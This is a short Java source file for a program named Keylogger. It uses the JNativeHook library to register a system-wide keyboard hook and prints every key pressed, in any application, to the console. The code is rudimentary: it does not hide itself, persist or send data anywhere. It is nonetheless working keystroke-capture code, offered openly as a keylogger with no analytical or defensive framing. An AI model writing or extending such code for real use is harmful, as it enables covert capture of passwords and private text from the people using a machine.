/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseMotionListener;

/**
 *
 * @author sparsha
 */
public class Keylogger implements NativeKeyListener,NativeMouseMotionListener{
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        try{
        GlobalScreen.registerNativeHook();
        }catch(Exception e)
        {
            
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
        System.out.print(" ");
        else
            System.out.print(NativeKeyEvent.getKeyText(nke.getKeyCode()));

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        
    }

    @Override
    public void nativeMouseMoved(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent nme) {
    }
    
}
